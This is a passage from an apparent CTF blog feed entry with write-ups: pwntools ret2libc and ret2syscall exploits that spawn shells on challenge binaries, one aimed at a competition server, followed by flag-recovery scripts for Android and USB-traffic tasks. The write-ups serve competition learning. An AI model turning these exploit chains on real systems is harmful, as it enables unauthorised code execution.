class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;58.240.236.231&quot;,49002)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;vul&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400783</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400781</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;OK,Good!&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>) </span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0000000000400509</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><h2 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag_chars = <span class="built_in">list</span>(<span class="string">&quot;0db530c0e9752357b1ae4cf7ea8331ae&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">0</span>, -<span class="number">4</span>):</span><br><span class="line">        temp = flag_chars[j]</span><br><span class="line">        flag_chars[j] = flag_chars[j - <span class="number">4</span>]</span><br><span class="line">        flag_chars[j - <span class="number">4</span>] = temp</span><br><span class="line">    j2 = i - <span class="number">1</span></span><br><span class="line">    temp2 = flag_chars[j2]</span><br><span class="line">    flag_chars[i - <span class="number">1</span>] = flag_chars[i - <span class="number">2</span>]</span><br><span class="line">    flag_chars[i - <span class="number">2</span>] = temp2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><h2 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -T json -r usb.pcapng &gt; test.json </span><br></pre></td></tr></table></figure><p>提取流量包，类似这种格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usbhid.data<span class="string">&quot;: &quot;</span><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">06</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1f</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">17</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">20</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1</span>c:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure><p>然后网上找脚本一把嗦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output :</span></span><br><span class="line"><span class="comment"># SEC2ETK3Y</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(arch=&lt;span class=&quot;string&quot;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, os=&lt;span class=&quot;string&quot;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&quot;string&quot;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# p = process(&amp;#x27;pwn&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = remote(&lt;span class=&quot;string&quot;&gt;&amp;#x27;58.240.236.231&amp;#x27;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;49003&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rdi = &lt;span class=&quot;number&quot;&gt;0x40072b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rsi = &lt;span class=&quot;number&quot;&gt;0x400735&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rax = &lt;span class=&quot;number&quot;&gt;0x400721&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;syscall = &lt;span class=&quot;number&quot;&gt;0x400741&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rdx = &lt;span class=&quot;number&quot;&gt;0x40073f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;binsh = &lt;span class=&quot;number&quot;&gt;0x601048&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;number&quot;&gt;0x48&lt;/span&gt;*&lt;span class=&quot;string&quot;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;+ p64(rax) + p64(&lt;span class=&quot;number&quot;&gt;59&lt;/span&gt;) + p64(rdi) + p64(&lt;span class=&quot;number&quot;&gt;0x601048&lt;/span&gt;) + p64(rsi) + p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + p64(syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="pwn" scheme="https://wuming.github.io/tags/pwn/"/>
    
    <category term="write up" scheme="https://wuming.github.io/tags/write-up/"/>
    
  </entry>
  
</feed>
